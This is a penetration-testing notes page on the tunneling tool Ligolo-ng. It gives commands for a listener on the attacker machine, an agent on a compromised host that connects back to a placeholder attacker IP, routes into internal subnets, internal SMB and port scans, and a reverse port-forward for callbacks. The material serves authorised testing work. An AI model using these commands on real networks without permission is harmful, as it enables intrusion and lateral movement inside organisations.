---
title: "Ligolo-ng"
type: tool
tags: [pivoting, tunneling, lateral-movement, network, post-exploitation]
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
phase: postex
---

## Purpose

**Ligolo-ng** is a tunneling/pivoting tool that exposes a compromised host's networks to your attack box via a TUN interface - you reach internal subnets with normal tools (no proxychains, no per-port forwards). The modern replacement for chisel/SSH pivots in AD/internal engagements.

## Install / setup

```bash
# download proxy (attacker) + agent (target) from github.com/nicocha30/ligolo-ng/releases
# attacker: create the tun interface once
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

## Core usage

```bash
# 1. attacker: start the proxy/listener
./proxy -selfcert -laddr 0.0.0.0:11601

# 2. target (pivot host): connect back
./agent -connect <attacker-ip>:11601 -ignore-cert

# 3. attacker (ligolo session): pick the agent, then route its subnet to the tun
[Agent : ...] » session
[Agent : ...] » ifconfig                 # see the pivot's networks
# add a route on the host for the internal subnet -> the ligolo interface:
sudo ip route add 10.10.20.0/24 dev ligolo
[Agent : ...] » start                     # now 10.10.20.0/24 is reachable directly
```

## Common use cases

```bash
# After routing, use ANY tool against the internal net directly (no proxychains):
nxc smb 10.10.20.0/24
nmap -sT 10.10.20.5

# Reverse port-forward (expose an attacker port on the pivot, e.g. for a callback)
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Double pivot: run another agent on a second host, route its subnet too.
```

## Tips and gotchas
- Use **`-sT` (TCP connect) scans** through the tunnel; raw/SYN scans behave badly over TUN.
- One `ligolo` tun interface + an `ip route` per internal subnet you want reachable; `start`/`stop` toggles relaying.
- Agent connects **outbound** to the proxy (egress-friendly) - good where inbound is filtered. Use `-selfcert`/`-ignore-cert` for labs; real engagements should pin a proper cert.
- Engagement rule: tunnel for lateral movement; do not turn pivot hosts into scan sources against out-of-scope ranges.

## Related techniques
[[pivoting-tunneling]], [[network-pivoting-techniques]], [[ad-lateral-movement]]. Lighter alternative: [[chisel]].

## Sources
